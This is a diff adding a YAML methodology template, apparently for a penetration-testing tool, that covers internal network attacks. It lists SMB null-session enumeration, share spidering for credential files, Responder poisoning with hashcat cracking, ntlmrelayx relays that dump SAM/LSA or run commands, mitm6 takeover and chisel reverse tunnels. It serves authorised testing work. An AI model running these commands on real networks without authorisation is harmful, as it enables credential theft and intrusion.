@@ -1,0 +1,126 @@
+name: "Internal Network"
+version: "1.0.0"
+author: "HackMind"
+tier: asset
+description: >
+  Container asset for an internal network segment or environment. It holds the
+  network-position attacks that are not tied to a single host (name-resolution
+  poisoning, NTLM relay, SMB enumeration, pivoting) and acts as a parent: add the
+  systems you discover (Domain Controller, Host, Database, internal Web App / API)
+  as sub-assets beneath it, each with its own template.
+
+nodes:
+  - id: in_overview
+    type: info
+    title: "Internal Network — how to use this asset"
+    content: |
+      This asset represents a network segment (or the internal environment as a
+      whole). Use it for attacks that operate at the network level rather than
+      against one system, then nest the specific systems you find as sub-assets:
+
+        Internal Network
+          - Domain Controller   (AD enumeration & attacks)
+          - Host                (per-host privesc, creds, lateral movement, persistence)
+          - Database            (direct database-service attacks)
+          - Web App / API       (the relevant testing template)
+
+      Network-position attacks below (poisoning, relay) are intrusive and noisy —
+      confirm they are in scope before running them.
+
+  - id: in_enum
+    type: info
+    title: "Network enumeration"
+    content: "Map hosts, shares, and trust relationships available from this segment."
+    children:
+      - id: in_smb_enum
+        type: checklist
+        title: "SMB / null-session enumeration"
+        content: |
+          - crackmapexec smb <CIDR> --shares -u '' -p ''       (null session)
+          - crackmapexec smb <CIDR> --shares -u 'guest' -p ''
+          - smbclient -L //<IP> -N
+          - smbmap -H <IP> -u '' (null) then again with credentials once obtained
+          - enum4linux-ng -A <IP>   (users, groups, shares, password policy via RID cycling)
+
+          Spider readable shares for secrets:
+          - crackmapexec smb <IP> -M spider_plus
+          - Look for: passwords.txt, *.kdbx, *.pfx, web.config, *.config, unattend.xml, id_rsa
+
+          Record the domain / workgroup and any Domain Controllers found — add each DC
+          as a "Domain Controller" sub-asset.
+
+      - id: in_signing
+        type: checklist
+        title: "SMB signing inventory (relay targets)"
+        content: |
+          NTLM relay only works against hosts that do not require SMB signing:
+          - crackmapexec smb <CIDR> --gen-relay-list relay_targets.txt
+          - nmap --script smb2-security-mode -p445 <CIDR>
+          Keep relay_targets.txt for the relay step below.
+
+  - id: in_position
+    type: question
+    title: "Are intrusive network-position attacks (poisoning / relay) in scope?"
+    options:
+      - label: "Yes"
+        key: "yes"
+        children:
+          - id: in_poisoning
+            type: checklist
+            title: "LLMNR / NBT-NS / mDNS poisoning"
+            content: |
+              CAUTION: Responder is noisy — confirm it is in scope and acceptable.
+              - responder -I eth0 -wPv
+              Captures NTLMv2 hashes from hosts resolving non-existent names.
+              - Crack offline: hashcat -m 5600 ntlmv2.txt rockyou.txt -r best64.rule
+              - Do NOT crack machine-account hashes (uncrackable) — relay them instead.
+
+          - id: in_relay
+            type: checklist
+            title: "NTLM relay"
+            content: |
+              When SMB signing is not enforced (use relay_targets.txt from the signing step):
+              - Turn off Responder's SMB/HTTP servers first (Responder.conf), then poison
+              - ntlmrelayx.py -tf relay_targets.txt -smb2support
+                -> dump SAM/LSA on the target, or -c "<command>" for execution
+              - Relay to LDAP/LDAPS for ACL abuse or to create a computer account:
+                ntlmrelayx.py -t ldaps://<DC> --delegate-access
+              - Relay to AD CS web enrolment (ESC8):
+                ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp -smb2support --adcs
+
+          - id: in_ipv6
+            type: checklist
+            title: "IPv6 DNS takeover (mitm6)"
+            content: |
+              Default Windows prefers IPv6 and has no DHCPv6 server — spoof one:
+              - mitm6 -d <domain>
+              - ntlmrelayx.py -6 -t ldaps://<DC> -wh fakewpad.<domain> --delegate-access
+              Result: relayed machine auth -> RBCD / machine account creation -> escalation.
+      - label: "No"
+        key: "no"
+        children: []
+
+  - id: in_pivoting
+    type: checklist
+    title: "Pivoting and tunnelling"
+    content: |
+      When a compromised host reaches isolated subnets, tunnel through it:
+      - chisel: ./chisel server -p 8080 --reverse (attacker) /
+                ./chisel client <attacker>:8080 R:socks (target)
+      - ligolo-ng: more stable for complex / multi-hop tunnels
+      - ssh -D 1080 <user>@<compromised>   (SOCKS via SSH)
+      - proxychains + any tool through the SOCKS proxy
+      Update /etc/proxychains.conf, then re-run enumeration against the newly reachable
+      ranges and add any new systems as sub-assets.
+
+  - id: in_subassets
+    type: checklist
+    title: "Add discovered systems as sub-assets"
+    content: |
+      For each system worth testing, add a sub-asset under this Internal Network node:
+      - Domain Controller / Active Directory  -> Domain Controller template
+      - Windows / Linux server or workstation -> Host template
+      - Database server                       -> Database template
+      - Internal web application              -> Web Application Testing template
+      - Internal API                          -> API Security Testing template
+      Track which systems have been added so coverage stays complete.
